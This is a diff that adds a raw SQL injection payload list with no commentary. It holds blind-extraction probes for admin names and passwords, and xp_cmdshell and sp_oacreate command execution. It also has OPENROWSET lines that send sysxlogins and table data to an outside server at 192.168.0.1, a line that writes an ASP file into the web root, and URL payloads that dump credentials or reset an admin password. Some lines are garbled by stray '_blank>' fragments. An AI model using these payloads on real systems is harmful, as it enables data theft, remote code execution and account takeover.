@@ -1,0 +1,124 @@
+; and 1=1 and 1=2
+and 0<>(select count(*) from *)
+and 0<>(select count(*) from admin)
+and 0<(select count(*) from admin) 
+and 1<(select count(*) from admin)
+and 1=(select count(*) from admin where len(*)>0)
+and 1=(select count(*) from admin where len(用户字段名称name)>0) 
+and 1=(select count(*) from admin where len(_blank>password)>0)
+and 1=(select count(*) from admin where len(*)>0) 
+and 1=(select count(*) from admin where len(name)>6)
+and 1=(select count(*) from admin where len(name)>5)
+and 1=(select count(*) from admin where len(name)=6)
+and 1=(select count(*) from admin where len(password)>11)
+and 1=(select count(*) from admin where len(password)>12)
+and 1=(select count(*) from admin where len(password)=12)
+and 1=(select count(*) from admin where left(name,1)=a)
+and 1=(select count(*) from admin where left(name,2)=ab)
+and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) -- 
+;declare @a sysname set @a=xp_blank>_+cmdshell exec @a dir c:\ 
+;declare @a sysname set @a=xp+_blank>_cm’+’dshell exec @a dir c:\
+select * from OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select *
+from table1 ) 
+select * from OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address
+=192.168.0.1,1433;, select * from table 
+insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select *
+from table1) select * from table2 
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address
+=192.168.0.1,1433;,select * from table1) select * from table2 
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address
+=192.168.0.1,1433;,select * from _blank>_sysdatabases) 
+select * from master.dbo.sysdatabases 
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address
+=192.168.0.1,1433;,select * from _blank>_sysobjects) 
+select * from user_blank>
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address
+=192.168.0.1,1433;,select * from _blank>_syscolumns) 
+select * from user_blank>_database.dbo.syscolumns 
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address
+=192.168.0.1,1433;,select * from table1) select * from database..table1 
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Addres
+s=192.168.0.1,1433;,select * from table2) select * from database..table2
+insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,s
+elect * from _blank>_sysxlogins) select * from database.dbo.sysxlogins 
+;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3
+nvarchar(255));
+;insert temp exec master.dbo.xp_blank>_availablemedia;
+;insert into temp(id) exec master.dbo.xp_blank>_subdirs c:\;
+;insert into temp(id,num1) exec master.dbo.xp_blank>_dirtree c:\;
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell type c:\web\index.asp;-
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell dir c:\;-- 
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell dir c:\ *.asp /s/a;-- 
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell cscript C:\Inetpub\Admin
+Scripts\adsutil.vbs enum w3svc 
+;insert into temp(id,num1) exec master.dbo.xp_blank>_dirtree c:\;-- （xp_blank>_ 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(sysadmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(serveradmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(setupadmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(securityadmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(securityadmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(diskadmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(bulkadmin));-- 
+and 1=(SELECT IS_blank>_SRVROLEMEMBER(bulkadmin));-- 
+and 1=(SELECT IS_blank>_MEMBER(db_blank>_owner));--
+;create table dirs(paths varchar(100), id int)-- 
+;insert dirs exec master.dbo.xp_blank>_dirtree c:\-- 
+and 0<>(select top 1 paths from dirs)-- 
+and 0<>(select top 1 paths from dirs where paths not in(@Inetpub))-- 
+;create table dirs1(paths varchar(100), id int)-- 
+;insert dirs exec master.dbo.xp_blank>_dirtree e:\web-- 
+and 0<>(select top 1 paths from dirs1)--
+;declare @a sysname; set @a=db_blank>_name();backup database @a to disk
+and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where
+xtype=char(85)) T order by id desc) 
+and 1=(Select Top 1 col_blank>_name(object_blank>_id(USER_blank>_LOGIN) 
+and 1=(select user_blank>_id from USER_blank>_LOGIN) 
+and 0=(select user from USER_blank>_LOGIN where user>1)
+declare @o int 
+exec sp_blank>_oacreate wscript.shell, @o out 
+exec sp_blank>_oamethod @o, run, NULL, notepad.exe 
+; declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>
+_oamethod @o, run, NULL, notepad.exe--
+declare @o int, @f int, @t int, @ret int 
+declare @line varchar(8000) 
+exec sp_blank>_oacreate scripting.filesystemobject, @o out 
+exec sp_blank>_oamethod @o, opentextfile, @f out, c:\boot.ini, 1 
+exec @ret = sp_blank>_oamethod @f, readline, @line out 
+while( @ret = 0 ) 
+begin 
+print @line 
+exec @ret = sp_blank>_oamethod @f, readline, @line out 
+end
+declare @o int, @f int, @t int
+exec sp_blank>_oacreate scripting.filesystemobject, @o out 
+exec sp_blank>_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1 
+exec @ret = sp_blank>_oamethod @f, writeline, NULL,
+declare @o int, @ret int 
+exec sp_blank>_oacreate speech.voicetext, @o out 
+exec sp_blank>_oamethod @o, register, NULL, foo, bar 
+exec sp_blank>_oasetproperty @o, speed, 150 
+exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong
+to,us, 528 
+waitfor delay 00:00:05
+; declare @o int, @ret int exec sp_blank>_oacreate speech.voicetext, @o out
+exec sp_blank>_oamethod @o, register, NULL, foo, bar exec sp_blank>_oasetp
+roperty @o, speed, 150 exec sp_blank>_oamethod @o, speak, NULL, all your
+sequel servers are belong to us, 528 waitfor delay 00:00:05--
+exec master.dbo.xp_blank>_dirtree c:\ 
+create table dirs(paths varchar(100), id int)  
+insert dirs exec master.dbo.xp_blank>_dirtree c:\ 
+http://127.0.0.1/injection/user.php?username=angel' and LENGTH(password)='6
+http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,1)='m
+http://127.0.0.1/injection/show.php?id=1' union select 1,username,password from user/*
+http://127.0.0.1/injection/show.php?id=' union select 1,username,password from user/*
+http://127.0.0.1/injection/user.php?username=angel' into outfile 'c:/file.txt
+http://127.0.0.1/injection/user.php?username=' or 1=1 into outfile 'c:/file.txt
+http://127.0.0.1/injection/show.php?id=' union select 1,username,password from user into outfile 'c:/user.txt
+INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', '$username', '$password', '$homepage', '1');
+UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'
+http://4ngel.net', userlevel='3
+UPDATE user SET password='mypass', homepage='http://4ngel.net', userlevel='3' WHERE id='$id'
+mypass)' WHERE username='admin'#
+UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'
+' OR username='admin'
+UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'
